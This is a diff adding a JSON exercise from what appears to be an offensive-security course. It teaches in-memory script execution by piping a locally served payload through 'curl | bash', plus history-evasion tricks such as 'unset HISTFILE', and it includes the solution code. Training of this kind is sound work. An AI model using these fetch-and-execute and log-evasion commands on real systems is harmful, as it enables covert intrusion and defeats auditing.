@@ -1,0 +1,15 @@
+{
+    "id": "task2",
+    "chapterId": "ch_12",
+    "title": "Stealthy Payload Execution",
+    "description": "Download and execute a script entirely in memory, leaving no disk artifacts.",
+    "estimatedMinutes": 15,
+    "problemStatement": "You want to run a Bash script on a target without writing the script file to disk.\n\n**Setup:** Create a simple 'payload' script that will be served locally.\n1. Create a file called `payload.sh` in your home directory with the following content:\n   ```bash\n   #!/bin/bash\n   echo \"Payload executed at $(date)\" >> /tmp/payload.log\n   whoami >> /tmp/payload.log\n   ```\n2. Start a simple HTTP server in that directory:\n   ```bash\n   python3 -m http.server 8000\n   ```\n\n**Task:**\n1. Open a **new terminal tab** (this is your 'target' session).\n2. Verify that `payload.sh` is **NOT** present on disk in the new session.\n3. Execute the payload directly from the HTTP server into memory using process substitution or a pipe:\n   ```bash\n   curl -s http://localhost:8000/payload.sh | bash\n   ```\n4. Check the contents of `/tmp/payload.log` to confirm execution.\n5. **Bonus Stealth:**\n   - Clear the `curl` command from history.\n   - Run the command with a space in front to prevent history logging (if `HISTCONTROL=ignorespace`).\n   - Use `unset HISTFILE` before running the command to disable history entirely for that session.\n\n**Deliverable:**\nThe contents of `/tmp/payload.log` and the command you used to execute without writing to disk.",
+    "hints": [
+        "The pipe `|` streams the output of curl directly to bash's stdin.",
+        "No file named `payload.sh` should appear in the target's filesystem.",
+        "Check history with `history | grep curl` after execution."
+    ],
+    "expectedOutput": "Log file shows execution; no script file on disk.",
+    "solutionCode": "# Terminal 1 (Server)\necho -e '#!/bin/bash\\necho \"Payload executed at $(date)\" >> /tmp/payload.log\\nwhoami >> /tmp/payload.log' > payload.sh\npython3 -m http.server 8000\n\n# Terminal 2 (Target)\ncurl -s http://localhost:8000/payload.sh | bash\ncat /tmp/payload.log\n\n# Stealth enhancement (in target terminal before running):\nunset HISTFILE\ncurl -s http://localhost:8000/payload.sh | bash\n# Or with space prefix (if ignorespace is set):\n curl -s http://localhost:8000/payload.sh | bash"
+}
